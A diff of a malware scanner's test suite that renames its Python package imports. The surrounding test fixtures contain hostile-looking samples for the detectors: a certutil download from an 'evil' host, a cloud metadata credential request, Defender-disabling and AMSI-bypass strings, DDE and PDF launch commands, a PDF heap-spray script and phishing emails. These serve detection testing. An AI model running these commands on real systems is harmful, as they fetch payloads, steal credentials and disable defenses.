@@ -2,11 +2,11 @@
 
 from __future__ import annotations
 
-from hawkscan.core import fileinfo
-from hawkscan.analyzers.base import AnalysisContext
-from hawkscan.analyzers.rtf_analyzer import RTFAnalyzer
-from hawkscan.analyzers.binprofile import BinProfileAnalyzer
-from hawkscan.analyzers.strings_analyzer import _is_whitelisted
+from hawk_malware_scan.core import fileinfo
+from hawk_malware_scan.analyzers.base import AnalysisContext
+from hawk_malware_scan.analyzers.rtf_analyzer import RTFAnalyzer
+from hawk_malware_scan.analyzers.binprofile import BinProfileAnalyzer
+from hawk_malware_scan.analyzers.strings_analyzer import _is_whitelisted
 
 
 def _ctx(tmp_path, name, data, strings=None):
@@ -36,7 +36,7 @@ def test_binprofile_detects_go(tmp_path):
 
 
 def test_binprofile_recovers_go_buildinfo(tmp_path):
-    from hawkscan.analyzers.binprofile import BinProfileAnalyzer
+    from hawk_malware_scan.analyzers.binprofile import BinProfileAnalyzer
     data = (b"go1.21.3 runtime.goexit \xff Go buildinf:\x08\x00"
             b"path\tgithub.com/evil/loader\n"
             b"dep\tgithub.com/pkg/errors\tv0.9.1\th1:xyz\n")
@@ -55,7 +55,7 @@ def test_binprofile_detects_dotnet(tmp_path):
 
 
 def test_onenote_detected_with_embedded_object(tmp_path):
-    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    from hawk_malware_scan.analyzers.office_analyzer import OfficeAnalyzer
     one = (b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3"
            + b"\x00" * 32 + b"\xe7\x16\xe3\xbd\x65\x26\x11\x45" + b"MZ")
     ctx = _ctx(tmp_path, "n.one", one)
@@ -65,7 +65,7 @@ def test_onenote_detected_with_embedded_object(tmp_path):
 
 
 def test_macho_deep_indicators(tmp_path):
-    from hawkscan.analyzers.macho_analyzer import MachOAnalyzer
+    from hawk_malware_scan.analyzers.macho_analyzer import MachOAnalyzer
     data = (b"\xcf\xfa\xed\xfe" + b"\x00" * 20
             + b" AuthorizationExecuteWithPrivileges login.keychain "
             + b".ssh/authorized_keys spctl --master-disable")
@@ -77,7 +77,7 @@ def test_macho_deep_indicators(tmp_path):
 
 
 def test_secrets_and_cloud_detection(tmp_path):
-    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
+    from hawk_malware_scan.analyzers.secrets_analyzer import SecretsAnalyzer
     data = (b"export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n"
             b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/r\n"
             b"-----BEGIN RSA PRIVATE KEY-----\n")
@@ -98,7 +98,7 @@ def test_ios_ipa_type_detection(tmp_path):
 
 def test_lnk_command_detection(tmp_path):
     import struct
-    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
+    from hawk_malware_scan.analyzers.lnk_analyzer import LnkAnalyzer
     hdr = bytearray(76)
     hdr[0:4] = (76).to_bytes(4, "little")
     hdr[4:20] = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
@@ -111,7 +111,7 @@ def test_lnk_command_detection(tmp_path):
 
 
 def test_vbe_encoder_detection(tmp_path):
-    from hawkscan.analyzers.script_analyzer import ScriptAnalyzer
+    from hawk_malware_scan.analyzers.script_analyzer import ScriptAnalyzer
     ctx = _ctx(tmp_path, "x.vbe", b"#@~^ABCD==encoded==^#~@")
     titles = [f.title for f in ScriptAnalyzer().analyze(ctx)]
     assert any("Encoded script" in t for t in titles)
@@ -119,7 +119,7 @@ def test_vbe_encoder_detection(tmp_path):
 
 def test_pcap_beaconing_detection(tmp_path):
     import struct
-    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer
+    from hawk_malware_scan.analyzers.pcap_analyzer import PcapAnalyzer
 
     def rec(ts):
         eth = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00"
@@ -137,7 +137,7 @@ def test_pcap_beaconing_detection(tmp_path):
 
 
 def test_stego_appended_executable(tmp_path):
-    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
+    from hawk_malware_scan.analyzers.stego_analyzer import StegoAnalyzer
     jpeg = b"\xff\xd8\xff\xe0" + b"\x00" * 200 + b"\xff\xd9"
     ctx = _ctx(tmp_path, "s.jpg", jpeg + b"MZ\x90\x00" + b"\x00" * 300)
     titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
@@ -145,7 +145,7 @@ def test_stego_appended_executable(tmp_path):
 
 
 def test_polyglot_detection(tmp_path):
-    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
+    from hawk_malware_scan.analyzers.stego_analyzer import StegoAnalyzer
     png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 40 + b"IEND" + b"\x00" * 4
     ctx = _ctx(tmp_path, "p.png", png + b"PK\x03\x04 zip")
     titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
@@ -153,7 +153,7 @@ def test_polyglot_detection(tmp_path):
 
 
 def test_ole_analyzer_handles_non_ole_gracefully(tmp_path):
-    from hawkscan.analyzers.ole_analyzer import OleAnalyzer
+    from hawk_malware_scan.analyzers.ole_analyzer import OleAnalyzer
     # Applies only to OLE; a non-OLE file simply does not match.
     ctx = _ctx(tmp_path, "x.txt", b"not an ole file")
     assert OleAnalyzer().applies(ctx) is False
@@ -167,7 +167,7 @@ def test_ioc_whitelist():
 
 def test_pcap_extracts_dns_and_flags_suspicious_tld(tmp_path):
     import struct
-    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer
+    from hawk_malware_scan.analyzers.pcap_analyzer import PcapAnalyzer
 
     dns = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
     for lbl in "evil-c2.ru".split("."):
@@ -190,7 +190,7 @@ def test_pcap_extracts_dns_and_flags_suspicious_tld(tmp_path):
 
 def test_email_phishing_indicators(tmp_path):
     import base64
-    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
+    from hawk_malware_scan.analyzers.email_analyzer import EmailAnalyzer
     pe_b64 = base64.b64encode(b"MZ" + b"\x90" * 32).decode()
     eml = (
         'From: "Bank" <help@bank.com>\n'
@@ -233,9 +233,9 @@ def test_pe_header_anomalies_on_mutated_binary(tmp_path):
     src = _system_pe()
     if not src:
         pytest.skip("no system PE available on this host")
-    from hawkscan.core import fileinfo
-    from hawkscan.analyzers.base import AnalysisContext
-    from hawkscan.analyzers.pe_analyzer import PEAnalyzer
+    from hawk_malware_scan.core import fileinfo
+    from hawk_malware_scan.analyzers.base import AnalysisContext
+    from hawk_malware_scan.analyzers.pe_analyzer import PEAnalyzer
 
     pe = pefile.PE(src)
     pe.FILE_HEADER.TimeDateStamp = 0
@@ -267,7 +267,7 @@ def _ooxml(tmp_path, name, parts):
 
 
 def test_office_remote_template_injection(tmp_path):
-    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    from hawk_malware_scan.analyzers.office_analyzer import OfficeAnalyzer
     rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
             'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
             'relationships/attachedTemplate" Target="http://evil.tld/t.dotm" '
@@ -281,7 +281,7 @@ def test_office_remote_template_injection(tmp_path):
 
 
 def test_office_dde_and_xlm(tmp_path):
-    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    from hawk_malware_scan.analyzers.office_analyzer import OfficeAnalyzer
     dde = _ooxml(tmp_path, "b.docx", {
         "[Content_Types].xml": "<Types/>",
         "word/document.xml": "<w:document><w:instrText>DDEAUTO cmd.exe"
@@ -296,7 +296,7 @@ def test_office_dde_and_xlm(tmp_path):
 
 
 def test_office_clean_hyperlink_no_fp(tmp_path):
-    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    from hawk_malware_scan.analyzers.office_analyzer import OfficeAnalyzer
     rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
             'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
             'relationships/hyperlink" Target="https://example.com" '
@@ -310,7 +310,7 @@ def test_office_clean_hyperlink_no_fp(tmp_path):
 
 def test_elf_structural_traits(tmp_path):
     import struct
-    from hawkscan.analyzers.elf_analyzer import ELFAnalyzer
+    from hawk_malware_scan.analyzers.elf_analyzer import ELFAnalyzer
     # 64-bit ELF exec with one RWX PT_LOAD segment and no section headers.
     e_ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\x00" * 9
     phoff, phentsize, phnum = 64, 56, 1
@@ -330,7 +330,7 @@ def test_elf_structural_traits(tmp_path):
 
 
 def test_pdf_exploit_js_extraction_and_iocs(tmp_path):
-    from hawkscan.analyzers.pdf_analyzer import PDFAnalyzer
+    from hawk_malware_scan.analyzers.pdf_analyzer import PDFAnalyzer
     js = ("var x=util.printf('%45000f',1);var u='http://evil-pdf-c2.com/p.exe';"
           "var s=unescape('%u9090%u9090%u4141%u4242%u4343%u4444%u5050%u6060');")
     pdf = (b"%PDF-1.5\n1 0 obj<</OpenAction<</S/JavaScript/JS(" + js.encode()
@@ -348,7 +348,7 @@ def test_pdf_exploit_js_extraction_and_iocs(tmp_path):
 
 def test_pdf_launch_target_extracted(tmp_path):
     import zlib
-    from hawkscan.analyzers.pdf_analyzer import PDFAnalyzer
+    from hawk_malware_scan.analyzers.pdf_analyzer import PDFAnalyzer
     pdf = (b"%PDF-1.7\n3 0 obj<</Type/Action/S/Launch/F(cmd.exe /c calc)>>endobj\n"
            b"%%EOF")
     ctx = _ctx(tmp_path, "y.pdf", pdf)
@@ -358,7 +358,7 @@ def test_pdf_launch_target_extracted(tmp_path):
 
 def test_macho_load_command_traits(tmp_path):
     import struct
-    from hawkscan.analyzers.macho_analyzer import MachOAnalyzer
+    from hawk_malware_scan.analyzers.macho_analyzer import MachOAnalyzer
     # 64-bit LE Mach-O with an RWX segment, encrypted segment, and a /tmp dylib.
     def seg(name, initprot):
         body = name.encode().ljust(16, b"\x00") + struct.pack("<QQQQ", 0, 0x1000, 0, 0)
@@ -387,7 +387,7 @@ def test_macho_load_command_traits(tmp_path):
 
 
 def test_email_phishing_body_analysis(tmp_path):
-    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
+    from hawk_malware_scan.analyzers.email_analyzer import EmailAnalyzer
     eml = (b'From: "Support" <noreply@secure-x.com>\nTo: a@b.com\n'
            b'Subject: verify\nContent-Type: text/html\n\n'
            b'<html>Click <a href="http://10.0.0.9/login">www.paypal.com</a> '
@@ -401,7 +401,7 @@ def test_email_phishing_body_analysis(tmp_path):
 
 
 def test_email_clean_no_phishing_fp(tmp_path):
-    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
+    from hawk_malware_scan.analyzers.email_analyzer import EmailAnalyzer
     eml = (b'From: "Alice" <alice@example.com>\nTo: bob@example.com\n'
            b'Subject: lunch\nContent-Type: text/plain\n\n'
            b'See you at noon: https://example.com/menu')
@@ -413,7 +413,7 @@ def test_email_clean_no_phishing_fp(tmp_path):
 
 def test_pcap_tls_sni_extraction(tmp_path):
     import struct
-    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer
+    from hawk_malware_scan.analyzers.pcap_analyzer import PcapAnalyzer
 
     def client_hello(host):
         hb = host.encode()
@@ -441,7 +441,7 @@ def test_pcap_tls_sni_extraction(tmp_path):
 
 def test_lnk_structured_args_and_icon_spoof(tmp_path):
     import struct
-    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
+    from hawk_malware_scan.analyzers.lnk_analyzer import LnkAnalyzer
     flags = 0x20 | 0x40 | 0x80  # args + icon + unicode
     hdr = bytearray(76)
     hdr[0:4] = (76).to_bytes(4, "little")
@@ -463,7 +463,7 @@ def test_lnk_structured_args_and_icon_spoof(tmp_path):
 
 
 def test_secrets_modern_tokens(tmp_path):
-    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
+    from hawk_malware_scan.analyzers.secrets_analyzer import SecretsAnalyzer
     # Tokens are assembled at runtime from fragments so no contiguous secret
     # literal appears in source (avoids secret-scanning push protection); the
     # analyzer still sees the full token in the scanned bytes.
@@ -481,15 +481,15 @@ def test_secrets_modern_tokens(tmp_path):
 
 
 def test_secrets_no_fp_on_plain_config(tmp_path):
-    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
+    from hawk_malware_scan.analyzers.secrets_analyzer import SecretsAnalyzer
     ctx = _ctx(tmp_path, "c.ini", b"name=app\nport=8080\nlog_level=info\ntimeout=30\n")
     assert list(SecretsAnalyzer().analyze(ctx)) == []
 
 
 def test_binprofile_packer_detection(tmp_path):
-    from hawkscan.analyzers.binprofile import BinProfileAnalyzer
-    from hawkscan.analyzers.base import AnalysisContext
-    from hawkscan.core import fileinfo
+    from hawk_malware_scan.analyzers.binprofile import BinProfileAnalyzer
+    from hawk_malware_scan.analyzers.base import AnalysisContext
+    from hawk_malware_scan.core import fileinfo
     f = tmp_path / "p.exe"
     f.write_bytes(b"MZ" + b"\x00" * 64)
     ctx = AnalysisContext(info=fileinfo.inspect(f), content=f.read_bytes())
@@ -506,7 +506,7 @@ def test_binprofile_packer_detection(tmp_path):
 def test_stego_no_polyglot_fp_on_random_image_bytes(tmp_path):
     # A JPEG with random body bytes containing a chance 'MZ' must NOT be flagged
     # as a PE polyglot (the old 2-byte match false-positived on every image).
-    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
+    from hawk_malware_scan.analyzers.stego_analyzer import StegoAnalyzer
     body = bytes((i * 73 + 0x4D) & 0xFF for i in range(4000))  # includes 'MZ' bytes
     jpeg = b"\xff\xd8\xff\xe0" + body + b"\xff\xd9"
     ctx = _ctx(tmp_path, "r.jpg", jpeg)
@@ -515,7 +515,7 @@ def test_stego_no_polyglot_fp_on_random_image_bytes(tmp_path):
 
 
 def test_stego_detects_pe_dos_stub_polyglot(tmp_path):
-    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
+    from hawk_malware_scan.analyzers.stego_analyzer import StegoAnalyzer
     jpeg = (b"\xff\xd8\xff\xe0" + b"\x00" * 100 + b"MZ\x90\x00"
             + b"This program cannot be run in DOS mode" + b"\x00" * 50 + b"\xff\xd9")
     ctx = _ctx(tmp_path, "x.jpg", jpeg)
@@ -524,7 +524,7 @@ def test_stego_detects_pe_dos_stub_polyglot(tmp_path):
 
 
 def test_strings_behavior_and_ioc_additions(tmp_path):
-    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
+    from hawk_malware_scan.analyzers.strings_analyzer import StringsAnalyzer
     data = (b"powershell Set-MpPreference -DisableRealtimeMonitoring $true\n"
             b"GetType('System.Management.Automation.AmsiUtils'); AmsiScanBuffer\n"
             b"certutil -urlcache -split -f http://evil/x.exe\n"
@@ -542,7 +542,7 @@ def test_strings_behavior_and_ioc_additions(tmp_path):
 
 
 def test_strings_clean_text_no_behavior_fp(tmp_path):
-    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
+    from hawk_malware_scan.analyzers.strings_analyzer import StringsAnalyzer
     ctx = _ctx(tmp_path, "r.txt", b"The quick brown fox jumps over the lazy dog. " * 20)
     cats = {f.category for f in StringsAnalyzer().analyze(ctx)}
     assert "evasion" not in cats and "ransomware" not in cats
